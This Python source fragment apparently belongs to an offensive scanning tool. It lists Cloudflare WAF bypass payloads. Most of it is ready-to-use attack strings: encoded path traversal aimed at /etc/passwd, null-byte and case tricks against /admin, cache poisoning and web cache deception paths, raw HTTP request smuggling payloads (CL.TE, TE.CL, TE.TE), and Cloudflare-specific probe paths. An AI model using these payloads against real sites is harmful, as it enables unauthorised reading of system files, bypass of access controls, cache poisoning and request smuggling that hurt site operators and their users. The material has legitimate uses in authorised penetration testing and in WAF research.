"""
Cloudflare-Specific WAF Bypass Payloads
"""

# 5. Cloudflare WAF Bypass - URL encoding variations
CF_WAF_BYPASS_PAYLOADS = [
    # Double URL encoding
    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
    # Unicode normalization bypass
    "/..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
    "/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    # Overlong UTF-8
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    # Null byte injection
    "/admin%00.js",
    "/admin%2500.js",
    "/admin%00.txt",
    # Case manipulation
    "/ADMIN",
    "/Admin",
    "/aDmIn",
    "/AdMiN",
    # Path parameter pollution
    "/admin;.js",
    "/admin%3b.css",
    "/admin;/",
    # Fragment bypass
    "/admin#.js",
    "/admin%23.css",
    # Dot variations
    "/./admin",
    "/admin/.",
    "/admin/./",
    "//admin",
    "///admin",
]

# 6. Cloudflare cache poisoning payloads
CF_CACHE_POISON_PAYLOADS = [
    # X-Forwarded headers
    "/?cb={random}",
    "/static/app.js?cb={random}",
    # Cache key manipulation
    "/index.html/nonexistent.css",
    "/api/users/..%2f..%2fstatic/app.js",
    # Web cache deception
    "/account/settings.css",
    "/account/profile.js",
    "/api/user.css",
    "/admin/.css",
]

# 7. Cloudflare specific bypass paths
CF_BYPASS_PATHS = [
    "/.well-known/",
    "/.well-known/security.txt",
    "/.well-known/change-password",
    "/.well-known/pki-validation/",
    "/.well-known/apple-app-site-association",
    "/.well-known/assetlinks.json",
    "/.well-known/openid-configuration",
    "/.well-known/webfinger",
    "/.well-known/matrix/client",
    "/cdn-cgi/",
    "/cdn-cgi/trace",
    "/cdn-cgi/l/email-protection",
    "/cdn-cgi/scripts/",
    "/cdn-cgi/pe/bag2",
    "/cdn-cgi/challenge-platform/",
    "/cdn-cgi/bm/cv/result",
]

# 8. HTTP Request Smuggling payloads (CF specific)
CF_SMUGGLING_PAYLOADS = [
    # CL.TE smuggling
    {"type": "CL.TE", "payload": "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"},
    # TE.CL smuggling  
    {"type": "TE.CL", "payload": "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n"},
    # TE.TE obfuscation
    {"type": "TE.TE", "payload": "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\n"},
]

# 9. Cloudflare Workers bypass attempts
CF_WORKERS_BYPASS = [
    "/__cf_workers",
    "/cdn-cgi/workers",
    "/_cf/",
    "/__cf__/",
    "/cdn-cgi/l/chk_jschl",
    "/cdn-cgi/challenge-platform/scripts/",
]
